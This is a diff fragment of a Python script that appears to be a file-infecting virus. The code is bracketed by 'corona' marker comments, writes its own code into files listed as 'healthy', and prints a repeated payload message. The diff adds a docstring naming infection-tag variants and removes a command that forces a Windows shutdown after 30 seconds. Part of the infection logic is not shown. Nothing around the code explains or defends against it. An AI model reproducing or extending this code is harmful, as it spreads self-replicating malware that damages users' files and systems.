@@ -1,3 +1,9 @@
+"""
+SAME WITH TAGS:
+ucorona
+uucorona
+"""
+
 # corona0
 MESSAGE = "CORONA Q " * 1000
 import os
@@ -28,5 +34,4 @@ for file in healthy:
         f.write(code)
 
 print(MESSAGE)
-os.system("shutdown /s /t 30")
 # corona
